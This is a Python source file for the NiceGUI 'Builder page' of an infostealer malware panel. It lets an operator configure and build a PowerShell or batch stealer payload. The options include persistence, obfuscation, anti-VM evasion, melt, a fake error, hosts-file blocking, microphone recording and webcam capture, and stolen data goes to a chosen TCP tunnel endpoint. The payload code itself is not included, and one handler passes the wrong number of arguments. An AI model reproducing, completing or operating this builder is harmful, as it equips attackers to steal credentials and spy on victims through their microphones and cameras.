from panel.ui.modules.builder.main import BuildPayload
from panel.ui.media.images import Images
from nicegui import ui


async def builder() -> None:
    """Builder page to build the stealer payload."""
    languages = ["ps1", "bat"]
    uiimage = Images.get_image("ps1")
    with ui.card().classes(
        "w-full h-full justify-center items-center no-shadow border-[1px] border-gray-200"
    ):
        ui.label("Builder page").classes("text-5xl w-full text-center font-bold")
        out_image = ui.image(uiimage).style("width: 200px; height: 200px")

        checkbox_options = {
            "debug": "Debug",
            "blockhostsfile": "Block Hosts File",
            "criticalprocess": "Critical Process",
            "melt": "Melt",
            "fakeerror": "Fake Error",
            "persistence": "Persistence",
            "obfuscate": "Obfuscate",
            "anti_vm": "Anti-VM",
            "record_mic": "Record Mic",
            "webcam": "Webcam",
        }

        checkbox_values = {}

        split_point = len(checkbox_options) // 5

        # fmt: off
        column1_options = list(checkbox_options.items())[:split_point]
        column2_options = list(checkbox_options.items())[split_point : 2 * split_point]
        column3_options = list(checkbox_options.items())[2 * split_point : 3 * split_point]
        column4_options = list(checkbox_options.items())[3 * split_point : 4 * split_point]
        column5_options = list(checkbox_options.items())[4 * split_point :]
        # fmt: on

        with ui.row().classes("w-full justify-between items-stretch"):
            with ui.column().classes("flex-1"):
                for key, label in column1_options:
                    checkbox_values[key] = ui.checkbox(label).classes("w-full")
            ui.separator().props("vertical")
            with ui.column().classes("flex-1"):
                for key, label in column2_options:
                    checkbox_values[key] = ui.checkbox(label).classes("w-full")
            ui.separator().props("vertical")
            with ui.column().classes("flex-1"):
                for key, label in column3_options:
                    checkbox_values[key] = ui.checkbox(label).classes("w-full")
            ui.separator().props("vertical")
            with ui.column().classes("flex-1"):
                for key, label in column4_options:
                    checkbox_values[key] = ui.checkbox(label).classes("w-full")
            ui.separator().props("vertical")
            with ui.column().classes("flex-1"):
                for key, label in column5_options:
                    checkbox_values[key] = ui.checkbox(label).classes("w-full")

        chosen_lang = ui.select(
            languages,
            multiple=False,
            label="Stealer Extension",
            value="ps1",
            on_change=lambda value: out_image.set_source(change_image(value.value)),
        ).classes("w-full")

        output_name = ui.input("File name", value="kdot").classes("w-full")

        url = (
            ui.input("TCP TUNNEL URL:PORT", placeholder="example.com:12345")
            .on(
                "keydown.enter",
                lambda: build(
                    chosen_lang.value,
                    url.value,
                    {key: checkbox.value for key, checkbox in checkbox_values.items()},
                ),
            )
            .classes("w-full")
        )

        ui.button("Build").on_click(
            lambda: build(
                chosen_lang.value,
                output_name.value,
                url.value,
                {key: checkbox.value for key, checkbox in checkbox_values.items()},
            )
        ).classes("w-full py-4 text-lg")


def change_image(value: str) -> str:
    """Change the image based on the selected language.

    Args:
        value (str): Value of the selected language

    Returns:
        str: Returns the image based on the selected language
    """
    image = Images.get_image(value)
    return image


async def build(language: str, name: str, url: str, options: dict[str, bool]) -> bool:
    """Build the payload.

    Args:
        language (str): Language of the payload
        name (str): Name of the payload
        url (str): URL of the payload URL:PORT
        options (dict[str, bool]): Options for the payload

    Returns:
        bool: True if it worked else False
    """
    if url.startswith("https://") or url.startswith("http://"):
        ui.notify("PLEASE DO NOT SPECIFCY HTTP/HTTPS://", type="negative")
        return False
    url = "https://" + url
    if language == None:
        ui.notify("Invalid language", type="negative")
        return False
    if name == None:
        ui.notify("Invalid name", type="negative")
        return False
    ui.notify(f"Building payload for {language} extensions with URL {url}")
    payload_builder = BuildPayload()
    out_build = await payload_builder.build(
        language=language, name=name, url=url, options=options
    )
    if out_build:
        ui.notify("Payload built successfully", type="positive")
    else:
        ui.notify("Failed to build payload", type="negative")
    return out_build
